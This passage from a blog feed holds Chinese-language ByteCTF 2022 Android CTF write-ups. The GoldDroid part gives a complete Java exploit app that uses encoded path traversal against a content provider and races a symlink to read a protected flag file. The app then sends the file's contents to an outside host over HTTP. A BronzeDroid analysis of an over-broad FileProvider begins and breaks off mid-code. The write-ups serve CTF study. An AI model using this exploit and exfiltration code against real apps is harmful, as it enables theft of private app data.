class="line">/data/data/com.bytectf.golddroid/files/flag</span><br></pre></td></tr></table></figure><p>这样读到的内容才是 flag。</p><p>两个线程，其中一个不断改变symlink的指向，指向合法的files和非法的flag，另外一个不断请求provider读取symlink ，等待请求到flag开头的数据就通过http回传(真实环境不是flag开头，而是ByteCTF)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -sf &lt;被指向的目标&gt; &lt;软链接文件本身&gt;</span><br></pre></td></tr></table></figure><h2 id="构建APP"><a href="#构建APP" class="headerlink" title="构建APP"></a>构建APP</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.pwngolddroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.net.Uri;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.os.ParcelFileDescriptor;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.activity.EdgeToEdge;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> androidx.core.graphics.Insets;</span><br><span class="line"><span class="keyword">import</span> androidx.core.view.ViewCompat;</span><br><span class="line"><span class="keyword">import</span> androidx.core.view.WindowInsetsCompat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.HttpURLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String dataDir;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        EdgeToEdge.enable(<span class="built_in">this</span>);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        dataDir = getApplication().getApplicationInfo().dataDir;</span><br><span class="line">        Log.d(<span class="string">&quot;Test&quot;</span>,dataDir);</span><br><span class="line">        <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(<span class="string">&quot;content://slipme/file1/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fdata%2Fdata%2Fcom%2Ebytectf%2Epwngolddroid%2Ffiles%2Fsymlink&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;chmod 777 -R &quot;</span> + dataDir).waitFor();</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;rm -rf &quot;</span> + dataDir + <span class="string">&quot;/files&quot;</span>).waitFor();</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;mkdir &quot;</span> + dataDir + <span class="string">&quot;/files&quot;</span>).waitFor();</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;ln -sf /storage/emulated/0/Android/data/com.bytectf.golddroid/files/sandbox/file1 &quot;</span> + dataDir + <span class="string">&quot;/files/symlink&quot;</span>).waitFor();</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;chmod 777 -R &quot;</span> + dataDir + <span class="string">&quot;/files&quot;</span>).waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Runtime.getRuntime().exec(<span class="string">&quot;ln -sf /storage/emulated/0/Android/data/com.bytectf.golddroid/files/sandbox/file1 &quot;</span> + dataDir + <span class="string">&quot;/files/symlink&quot;</span>).waitFor();</span><br><span class="line">                        Runtime.getRuntime().exec(<span class="string">&quot;ln -sf /data/data/com.bytectf.golddroid/files/flag &quot;</span> + dataDir + <span class="string">&quot;/files/symlink&quot;</span>).waitFor();</span><br><span class="line">                        Runtime.getRuntime().exec(<span class="string">&quot;chmod 777 -R &quot;</span> + dataDir + <span class="string">&quot;/files&quot;</span>).waitFor();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (uri != <span class="literal">null</span>) &#123;</span><br><span class="line">                            Log.d(<span class="string">&quot;Test&quot;</span>, uri.toString());</span><br><span class="line">                            <span class="type">ParcelFileDescriptor</span> <span class="variable">parcelFileDescriptor</span> <span class="operator">=</span> getContentResolver().openFileDescriptor(uri, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">                            <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(parcelFileDescriptor.getFileDescriptor());</span><br><span class="line"></span><br><span class="line">                            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                            <span class="type">int</span> bytesRead;</span><br><span class="line">                            <span class="type">StringBuilder</span> <span class="variable">stringBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                            <span class="keyword">while</span> ((bytesRead = fileInputStream.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                                stringBuilder.append(<span class="keyword">new</span> <span class="title class_">String</span>(buffer, <span class="number">0</span>, bytesRead));</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            fileInputStream.close();</span><br><span class="line">                            parcelFileDescriptor.close();</span><br><span class="line">                            <span class="type">String</span> <span class="variable">fileContent</span> <span class="operator">=</span> stringBuilder.toString();</span><br><span class="line">                            <span class="keyword">if</span> (fileContent.startsWith(<span class="string">&quot;flag&quot;</span>)) &#123;</span><br><span class="line">                                httpGet(fileContent);</span><br><span class="line">                            &#125;</span><br><span class="line">                            Log.d(<span class="string">&quot;TEST&quot;</span>, fileContent);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line"><span class="comment">//                        e.printStackTrace();</span></span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line"><span class="comment">//                        e.printStackTrace();</span></span><br><span class="line">                    &#125;<span class="keyword">catch</span> (IllegalArgumentException e)&#123;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">httpGet</span><span class="params">(String msg)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="type">HttpURLConnection</span> <span class="variable">connection</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://xxx.xxx.xxx.xxx:8000/?msg=&quot;</span> + msg);</span><br><span class="line">                    connection = (HttpURLConnection) url.openConnection();</span><br><span class="line">                    connection.setRequestMethod(<span class="string">&quot;GET&quot;</span>);</span><br><span class="line">                    connection.getInputStream();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里需要注意必须要捕获IllegalArgumentException e异常，来处理校验不通过时的情况，否则抛出异常而不进行异常捕获，APP将会直接退出。</p></blockquote><p>这里还需要注意，如果targetSdk设置为30及以上，需要在pwngolddroid的Manifest中添加provider的需求声明，否则无法访问provider ，如果设置为27进行编译，则不需要进行声明</p><blockquote><p>在创建应用时，请务必考虑您的应用需要与之交互的设备中的其他应用。如果您的应用以 Android 11（API 级别 30）或更高版本为目标平台，在默认情况下，系统会自动让部分应用对您的应用可见，但会过滤掉其他应用。本指南将介绍如何让上述其他应用对您的应用可见。</p><p>如果您的应用以 Android 11 或更高版本为目标平台，并且需要与并非自动可见的应用交互，请在您应用的清单文件中添加 <queries> 元素。在 <queries> 元素中，按软件包名称、按 intent 签名或按提供程序授权指定其他应用，如以下部分所述。</p><p><a href="https://developer.android.google.cn/training/package-visibility/automatic?hl=zh-cn">了解自动可见的软件包  | App architecture  | Android Developers</a></p><p>这是 <strong>Android 11（API 30）引入的新机制</strong>。<strong>Android 11 开始，默认看不见别的 App</strong>即使Provider 是 <code>exported=true</code>authority 是对的<strong>系统也会直接拦</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260128215511740.png" alt="image-20260128215511740"></p></blockquote><p>xml：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">&quot;http://schemas.android.com/tools&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_NETWORK_STATE&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">queries</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">provider</span> <span class="attr">android:authorities</span>=<span class="string">&quot;slipme&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">queries</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">queries</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">package</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.golddroid&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">queries</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:dataExtractionRules</span>=<span class="string">&quot;@xml/data_extraction_rules&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:fullBackupContent</span>=<span class="string">&quot;@xml/backup_rules&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:theme</span>=<span class="string">&quot;@style/Theme.Pwngolddroid&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:usesCleartextTraffic</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;.MainActivity&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260128214946495.png" alt="image-20260128214946495"></p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260128215019077.png" alt="image-20260128215019077"></p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;queries&gt;</span><br><span class="line">    &lt;provider android:authorities=&quot;slipme&quot; /&gt;</span><br><span class="line">&lt;/queries&gt;</span><br><span class="line">允许App看见并访问authority 为 slipme 的 ContentProvider</span><br><span class="line">&lt;queries&gt;</span><br><span class="line">    &lt;package android:name=&quot;com.bytectf.golddroid&quot; /&gt;</span><br><span class="line">&lt;/queries&gt;</span><br><span class="line">允许你的 App看见整个应用包名是 com.bytectf.golddroid</span><br></pre></td></tr></table></figure><p>这俩都行</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Bytectf2022-GoldDroid复现&quot;&gt;&lt;a href=&quot;#Bytectf2022-GoldDroid复现&quot; class=&quot;headerlink&quot; title=&quot;Bytectf2022 GoldDroid复现&quot;&gt;&lt;/a&gt;Bytectf2022 GoldD</summary>
      
    
    
    
    <category term="Android" scheme="http://matriy330.github.io/categories/Android/"/>
    
    
    <category term="Android" scheme="http://matriy330.github.io/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>ByteDroid2022 BronzeDroid复现</title>
    <link href="http://matriy330.github.io/7f2da78c/"/>
    <id>http://matriy330.github.io/7f2da78c/</id>
    <published>2026-01-27T03:30:39.000Z</published>
    <updated>2026-01-27T03:30:25.653Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ByteDroid2022-BronzeDroid复现"><a href="#ByteDroid2022-BronzeDroid复现" class="headerlink" title="ByteDroid2022 BronzeDroid复现"></a>ByteDroid2022 BronzeDroid复现</h1><h2 id="APK分析"><a href="#APK分析" class="headerlink" title="APK分析"></a>APK分析</h2><h3 id="AndroidManifest-xml"><a href="#AndroidManifest-xml" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h3><p>FileProvider用来把 App 内部文件，用 <code>content://</code> 的方式安全地共享出去</p><blockquote><p>Android开始直接禁用file:&#x2F;&#x2F;共享</p></blockquote><p>而@xml&#x2F;file_path定义了可分享的范围:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">paths</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">root-path</span> <span class="attr">name</span>=<span class="string">&quot;root&quot;</span> <span class="attr">path</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">paths</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>&lt;root-path&gt;</code> 的意思是：<strong>把设备文件系统的根目录 &#x2F;作为可共享的基准路径</strong></li><li><code>path=&quot;&quot;</code> 基本等价于：<strong>不做任何子目录限制</strong></li><li><code>name=&quot;root&quot;</code> 只是一个别名（后面构造 <code>content://</code> 路径时会用到）</li></ul><p>然后的一些InitializationProvider初始化了一些组件，在启动时，似乎跟题目没有关系，emohi2什么的</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span> <span class="attr">android:versionCode</span>=<span class="string">&quot;1&quot;</span> <span class="attr">android:versionName</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">android:compileSdkVersion</span>=<span class="string">&quot;32&quot;</span> <span class="attr">android:compileSdkVersionCodename</span>=<span class="string">&quot;12&quot;</span> <span class="attr">package</span>=<span class="string">&quot;com.bytectf.bronzedroid&quot;</span> <span class="attr">platformBuildVersionCode</span>=<span class="string">&quot;32&quot;</span> <span class="attr">platformBuildVersionName</span>=<span class="string">&quot;12&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-sdk</span> <span class="attr">android:minSdkVersion</span>=<span class="string">&quot;21&quot;</span> <span class="attr">android:targetSdkVersion</span>=<span class="string">&quot;32&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span> <span class="attr">android:theme</span>=<span class="string">&quot;@style/Theme.BronzeDroid&quot;</span> <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span> <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span> <span class="attr">android:debuggable</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:fullBackupContent</span>=<span class="string">&quot;@xml/backup_rules&quot;</span> <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span> <span class="attr">android:appComponentFactory</span>=<span class="string">&quot;androidx.core.app.CoreComponentFactory&quot;</span> <span class="attr">android:dataExtractionRules</span>=<span class="string">&quot;@xml/data_extraction_rules&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.bronzedroid.MainActivity&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.bronzedroid.FlagReceiver&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.SET_FLAG&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">provider</span> <span class="attr">android:name</span>=<span class="string">&quot;androidx.core.content.FileProvider&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> <span class="attr">android:authorities</span>=<span class="string">&quot;com.bytectf.bronzedroid.fileprovider&quot;</span> <span class="attr">android:grantUriPermissions</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">&quot;android.support.FILE_PROVIDER_PATHS&quot;</span> <span class="attr">android:resource</span>=<span class="string">&quot;@xml/file_paths&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">provider</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">provider</span> <span class="attr">android:name</span>=<span class="string">&quot;androidx.startup.InitializationProvider&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> <span class="attr">android:authorities</span>=<span class="string">&quot;com.bytectf.bronzedroid.androidx-startup&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">&quot;androidx.emoji2.text.EmojiCompatInitializer&quot;</span> <span class="attr">android:value</span>=<span class="string">&quot;androidx.startup&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">&quot;androidx.lifecycle.ProcessLifecycleInitializer&quot;</span> <span class="attr">android:value</span>=<span class="string">&quot;androidx.startup&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">provider</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="MainActivity"><a href="#MainActivity" class="headerlink" title="MainActivity"></a>MainActivity</h3><p>如果action是ACTION_SHARET_TO_ME</p><p>就setResult-1,把启动时的intent原样返回</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.bronzedroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes3.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.app.Activity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        